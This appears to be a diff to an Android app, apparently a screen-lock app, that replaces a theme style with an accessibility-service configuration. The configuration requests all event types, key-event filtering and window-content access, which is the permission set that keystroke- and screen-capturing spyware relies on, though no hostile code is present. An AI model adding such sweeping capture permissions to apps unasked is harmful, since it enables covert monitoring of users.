@@ -1,8 +1,8 @@
-<!-- app/src/main/res/values/themes.xml -->
-<resources xmlns:tools="http://schemas.android.com/tools">
-    <style name="Theme.ScreenLock" parent="Theme.MaterialComponents.DayNight.DarkActionBar">
-        <item name="colorPrimary">@color/purple_500</item>
-        <item name="colorPrimaryDark">@color/purple_700</item>
-        <item name="colorOnPrimary">@color/white</item>
-    </style>
-</resources>
+<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:description="@string/accessibility_service_description"
+    android:accessibilityEventTypes="typeAllMask"
+    android:accessibilityFlags="flagDefault|flagRequestFilterKeyEvents"
+    android:canRetrieveWindowContent="true"
+    android:canRequestFilterKeyEvents="true"
+    android:settingsActivity="com.example.slapp.MainActivity" />
